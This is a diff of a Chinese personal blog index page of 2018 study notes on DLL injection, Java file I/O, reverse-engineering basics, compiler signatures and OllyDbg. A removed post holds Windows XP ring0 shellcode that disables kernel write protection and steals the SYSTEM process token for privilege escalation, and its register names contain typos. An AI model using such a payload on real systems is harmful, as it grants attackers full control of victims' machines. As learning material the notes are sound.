@@ -157,20 +157,20 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-内核shellcode" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-注入方式" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/内核shellcode/">ring0 shellcode</a>
+      <a class="article-title" href="/2018/08/20/注入方式/">dll注入方式</a>
     </h1>
   
 
 		
         
-        <a href="/2018/08/20/内核shellcode/" class="archive-article-date">
+        <a href="/2018/08/20/注入方式/" class="archive-article-date">
   	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
 </a>
         
@@ -179,10 +179,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>提权到SYSTEM 修改当前进程的token为SYSTEM进程的token</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">DWORD g_uCro;</span><br><span class="line">DWORD g_isRing0ShellCodeCalled = 0;</span><br><span class="line">NTSTATUS MyshellCode() &#123;</span><br><span class="line">	//关闭内核写保护</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		cli</span><br><span class="line">		mov eax,cr0</span><br><span class="line">		mov g_uCro,eax</span><br><span class="line">		and eax,0xFFFEFFFF</span><br><span class="line">		mov cro,eax</span><br><span class="line">	&#125;</span><br><span class="line">	//提权到system</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax,0xFFDFF124 //eax = KPCR(not 3G Mode)</span><br><span class="line">		mov eax,[eax]      //获取当前线程PETHREAD</span><br><span class="line">		mov esi,[eax+0x220] //获取当前进程所属进程的PEROCESS</span><br><span class="line">		mov eax,esi</span><br><span class="line">		searchXp:</span><br><span class="line">			mov eax,[eax+0x88]</span><br><span class="line">			sub eax,0x88 //获取进程链表下一个进程的PEPROCESS</span><br><span class="line">			mov edx,[eax+0x84] //获取进程的PID到edx</span><br><span class="line">			cmp edx,0x4 //通过PID查找SYSTEM进程</span><br><span class="line">			jne searchXp</span><br><span class="line">			mov eax,[eax+0xc8] //获取system进程的token</span><br><span class="line">			mov [esi+0xc8],eax //修改当前进程的token</span><br><span class="line">	&#125;</span><br><span class="line">	//恢复内核写保护</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		sti</span><br><span class="line">		mov eax,g_uCro</span><br><span class="line">		mov cro,eax</span><br><span class="line">	&#125;</span><br><span class="line">	g_isRing0ShellCodeCalled = 1;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        
       
 
       
@@ -195,11 +192,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">shellcode</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Window内核漏洞利用</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">dll注入</a>
         		</li>
       		
 		</ul>
@@ -209,7 +202,370 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/内核shellcode/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/08/20/注入方式/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-JAVA文件操作" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/20/JAVA文件操作/">JAVA文件操作</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/08/20/JAVA文件操作/" class="archive-article-date">
+  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">public static File CreateDIr(String Filepath)&#123;</span><br><span class="line">        File file = new File(Filepath);</span><br><span class="line">        if(!file.exists())&#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                file.mkdir();</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public static File CreateFile(String Filepath)&#123;</span><br><span class="line">        File file = new File(Filepath);</span><br><span class="line">        if(!file.exists())&#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    file.createNewFile();</span><br><span class="line">                &#125; catch (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    return null;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static String ReadFile(File file)&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            //1.创建文件输入流对象</span><br><span class="line">            FileInputStream inputStream = new FileInputStream(file);</span><br><span class="line">            //2.创建字节输出流对象</span><br><span class="line">            ByteArrayOutputStream byteArrayOutStream = new ByteArrayOutputStream();</span><br><span class="line">            //3.创建字节数组</span><br><span class="line">            byte bytes[] = new byte[1024];</span><br><span class="line">            int nReadNum = 0;</span><br><span class="line">            //使用文件输入流对象读取文件内容</span><br><span class="line">            while((nReadNum = inputStream.read(bytes,0,1024))!= -1)&#123;</span><br><span class="line">                byteArrayOutStream.write(bytes,0,nReadNum);</span><br><span class="line">            &#125;</span><br><span class="line">            return new String(byteArrayOutStream.toByteArray());</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static  String WriteFile(File file,String content)&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            //1.创建文件输入流对象</span><br><span class="line">            FileOutputStream OutputStream = new FileOutputStream(file);</span><br><span class="line">            //2.创建字节数组</span><br><span class="line">            byte bytes[] = content.getBytes();</span><br><span class="line">            int nReadNum = 0;</span><br><span class="line">            //使用文件输出流对象输出内容</span><br><span class="line">            OutputStream.write(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static String DeleteFile(File file)&#123;</span><br><span class="line">        if(file.exists())&#123;</span><br><span class="line">            if(file.isFile())&#123;</span><br><span class="line">                file.delete();</span><br><span class="line">            &#125;</span><br><span class="line">            else if(file.isDirectory())&#123;</span><br><span class="line">                File[] files = file.listFiles();</span><br><span class="line">                for(int i=0;i&lt;files.length;i++)&#123;</span><br><span class="line">                    DeleteFile(files[i]);</span><br><span class="line">                &#125;</span><br><span class="line">                file.delete();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return  null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Java</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/20/JAVA文件操作/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-逆向基础01" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/20/逆向基础01/">逆向基础01</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/08/20/逆向基础01/" class="archive-article-date">
+  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>查找main函数 visual stdio</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">参数:3个push</span><br><span class="line">伪代码:</span><br><span class="line">push env 应是地址</span><br><span class="line">push argv 应是地址</span><br><span class="line">push argc 可能是个变量</span><br><span class="line">call main</span><br><span class="line"></span><br><span class="line">VS2013 Main函数</span><br><span class="line">mainCRTstarup-&gt;初始化函数-&gt;main</span><br><span class="line">VS2015 Main函数</span><br><span class="line">mainCRTStartup-&gt;_scrt_common_main-&gt;_scrt_common_main_seh-&gt;invoke_main-&gt;main</span><br></pre></td></tr></table></figure>
+<ul>
+<li>2013找main<br><img src="http://picture.jbyusk.com:8080/res/2013_find_main1.png" alt=""><br><img src="http://picture.jbyusk.com:8080/res/2013_find_main2.png" alt=""><br><img src="http://picture.jbyusk.com:8080/res/2013_find_main3.png" alt=""></li>
+</ul>
+<ul>
+<li>2015找main<br><img src="http://picture.jbyusk.com:8080/res/2015_find_main1.png" alt=""><br><img src="http://picture.jbyusk.com:8080/res/2015_find_main2.png" alt=""><br><img src="http://picture.jbyusk.com:8080/res/2015_find_main3.png" alt=""><br>在调用j_exit之上的倒数第二个call<br><img src="http://picture.jbyusk.com:8080/res/2015_find_main4.png" alt=""><br><img src="http://picture.jbyusk.com:8080/res/2015_find_main5.png" alt=""></li>
+</ul>
+<ul>
+<li>2017找main<br><img src="http://picture.jbyusk.com:8080/res/2017_find_main1.png" alt=""><br><img src="http://picture.jbyusk.com:8080/res/2017_find_main2.png" alt=""><br><img src="http://picture.jbyusk.com:8080/res/2017_find_main3.png" alt=""><br>大致在mov [ebp+var_2C],eax之上<br><img src="http://picture.jbyusk.com:8080/res/2017_find_main4.png" alt=""><br><img src="http://picture.jbyusk.com:8080/res/2017_find_main5.png" alt=""></li>
+</ul>
+<blockquote>
+<p>查找WinMain函数 visual stdio</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">参数:4个push</span><br><span class="line">伪代码:</span><br><span class="line">push xx</span><br><span class="line">push xx</span><br><span class="line">push hPrevInstance</span><br><span class="line">push hInstance(模块基址,可能调用GetModuleHandleeA)</span><br><span class="line">call WinMain</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">逆向</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/20/逆向基础01/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-逆向基础02" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/20/逆向基础02/">逆向基础02-编译器特征</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/08/20/逆向基础02/" class="archive-article-date">
+  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>EXEINFO与PEID的原理<br>查壳或者查询编译语言使用特征<br>1.OEP特征<br>2.链接器特征<br>3.人肉查找的时候,查看区段名称</p>
+</blockquote>
+<h3 id="BC"><a href="#BC" class="headerlink" title="BC++"></a>BC++</h3><ol>
+<li>OEP特征<br><img src="http://picture.jbyusk.com:8080/res/BC++.png" alt=""><br>二进制特征:EB 10 66 62 3A 43 2B 2B 48 4F 4B<br>第一个调用的API是GetModHandleA</li>
+<li>链接器版本<br>5.00</li>
+<li>区段名称<br><img src="http://picture.jbyusk.com:8080/res/BC++1.png" alt=""></li>
+</ol>
+<h3 id="delphi"><a href="#delphi" class="headerlink" title="delphi+"></a>delphi+</h3><ol>
+<li>OEP特征<br><img src="http://picture.jbyusk.com:8080/res/delphi1.png" alt=""><br>二进制特征:55 8B EC 83 C4 F0 B8 ?? ?? ?? ?? E8<br>OEP处有5个CALL调用,第一个API调用是GetModuleHandleA<br>第一个调用的API是GetModHandleA</li>
+<li>链接器版本<br>2.25</li>
+<li>区段名称<br><img src="http://picture.jbyusk.com:8080/res/delphi2.png" alt=""></li>
+</ol>
+<h3 id="VC6-0-amp-易语言"><a href="#VC6-0-amp-易语言" class="headerlink" title="VC6.0 &amp; 易语言"></a>VC6.0 &amp; 易语言</h3><ol>
+<li>OEP特征<br><img src="http://picture.jbyusk.com:8080/res/yilan1.png" alt=""><br>二进制特征:55 8B EC 6A FF 68 ?? ?? ?? ?? 68 ?? ?? ?? ?? 64 A1 00 00 00 00 50 64 89 25 00 00 00 00 83 EC 58<br>OEP处开辟堆栈空间是sub esp,0x58<br>OEP处API调用GetVersion<br>第一个调用的API是GetModHandleA</li>
+<li>链接器版本<br>6.0</li>
+<li>区段名称<br><img src="http://picture.jbyusk.com:8080/res/yilan2.png" alt=""></li>
+</ol>
+<h3 id="VS程序的链接器版本"><a href="#VS程序的链接器版本" class="headerlink" title="VS程序的链接器版本"></a>VS程序的链接器版本</h3><p>VC 6.0 6.0<br>VC2003 7.0，7.1<br>VS2005 8.0<br>VS2008 9.0<br>VS2010 10.0<br>VS2012 11.0<br>VS2013 12.0<br>VS2015 14.0<br>VS2017 14.1</p>
+<ul>
+<li>VS2013 main函数特征<br>1.二进制特征<br>50 E8 ???????? 8B 00 50 E8 ???????? 8B 08 51 E8</li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">逆向</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/20/逆向基础02/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-ollydbg软件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/20/ollydbg软件/">ollydbg软件</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/08/20/ollydbg软件/" class="archive-article-date">
+  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>od支持的调试方式<br>① 支持拖拽<br>② 支持菜单 -文件 -打开,打开的时候可以添加命令行参数<br>③ 支持右键菜单打开<br>④ 支持附加调试<br>⑤ 支持DLL调试<br>⑥ 支持多线程调试</p>
+</blockquote>
+<blockquote>
+<p>od中的断点有哪些,原理分别是什么?<br>① 软件断点,F2,修改代码处为int3,异常触发再还原<br>② 硬件断点,寄存器设置地址到dr0~dr3,dr6,触发单步异常<br>③ 内存断点,修改属性(VirtualProtectEx)<br>④ 条件断点,Shift+F2,与软件断点一样<br>⑤ 消息断点，在条件基础上增加了宏定义<br>⑥ 记录断点，利用跟踪记录,然后设置条件,可以断下 </p>
+</blockquote>
+<p>快捷方式</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">逆向</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/20/ollydbg软件/">展开全文 >></a>
         </p>
       
 
@@ -290,6 +646,88 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2018/08/20/内核漏洞分类/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-android_studio_install" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/20/android_studio_install/">android studio install</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/08/20/android_studio_install/" class="archive-article-date">
+  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ol>
+<li>一直停留在fetching Android sdk compoment information界面<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">解决方法：</span><br><span class="line">　　1）找到安装的Android Studio目录下的bin目录。找到idea.properties文件，用文本编辑器打开。　　</span><br><span class="line">    2）在idea.properties文件末尾添加一行： disable.android.first.run=true ，然后保存文件。　　</span><br><span class="line">    3）关闭Android Studio后重新启动，便可进入界面。</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">android</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/20/android_studio_install/">展开全文 >></a>
         </p>
       
 
@@ -418,21 +856,21 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-python基础" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-逆向分析方法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/02/python基础/">python基础</a>
+      <a class="article-title" href="/2018/08/20/逆向分析方法/">逆向分析方法</a>
     </h1>
   
 
 		
         
-        <a href="/2018/08/02/python基础/" class="archive-article-date">
-  	<time datetime="2018-08-02T05:41:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-02</time>
+        <a href="/2018/08/20/逆向分析方法/" class="archive-article-date">
+  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
 </a>
         
       </header>
@@ -440,287 +878,13 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>type(变量)获取变量的类型<br>id(变量)查看地址</p>
-<blockquote>
-<p>整型</p>
-</blockquote>
-<p> port = 21<br> 连接字符串时需要用str()<br> 例子:print “test”+str(port)</p>
-<blockquote>
-<p>字符串</p>
-</blockquote>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">单引号 双引号(单引号不用换行) 三引号(多行)</span><br><span class="line">banner = &quot;Free FTP Server&quot;</span><br><span class="line">以下几个常用的函数</span><br><span class="line">print (banner.upper()) 打印大写</span><br><span class="line">print (banner.lower()) 打印小写</span><br><span class="line">print (banner.replace(&apos;Free&apos;,&apos;charge&apos;))替换,注意用单引号</span><br><span class="line">print (banner.find(&apos;FTP&apos;))查找字符串</span><br><span class="line">print (len(banner)) 获取长度 len计算字符数</span><br><span class="line"></span><br><span class="line">编码问题:</span><br><span class="line">以下2行强制使用utf-8编码</span><br><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">python 3版本字符串以Unicode编码</span><br><span class="line">对于单个字符的编码</span><br><span class="line">ord(&apos;A&apos;) #获取字符整数表示</span><br><span class="line">chr(66) #获取编码对应的字符</span><br><span class="line"></span><br><span class="line">UTF-8是可变长编码</span><br><span class="line">str.encode(&apos;ascii&apos;)</span><br><span class="line">str.encode(&apos;utf-8&apos;)</span><br><span class="line">byte.decode(&apos;utf-8&apos;,errors=&apos;ignore&apos;) #忽略错误的字节</span><br><span class="line"></span><br><span class="line">格式化字符串</span><br><span class="line">print(&apos;%2d-%s&apos; % (3,1))</span><br><span class="line">print(&apos;%.2f&apos; % 3.1415926)</span><br><span class="line">&apos;hello, &#123;0&#125;, 成绩提升了 &#123;1:.1f&#125;%&apos;.format(&apos;小明&apos;, 17.125)</span><br></pre></td></tr></table></figure>
-        
-          <a class="article-more-a" href="/2018/08/02/python基础/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/02/python基础/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-付出与收获" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/07/12/付出与收获/">付出与收获</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/07/12/付出与收获/" class="archive-article-date">
-  	<time datetime="2018-07-12T06:19:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-12</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="https://media.weibo.cn/wenda?id=2310684260825635404334" target="_blank" rel="noopener">https://media.weibo.cn/wenda?id=2310684260825635404334</a><br>看了校长的回答，突然想记录并想象一波。</p>
-<blockquote>
-<p>先将认为对的句子记录下来</p>
-</blockquote>
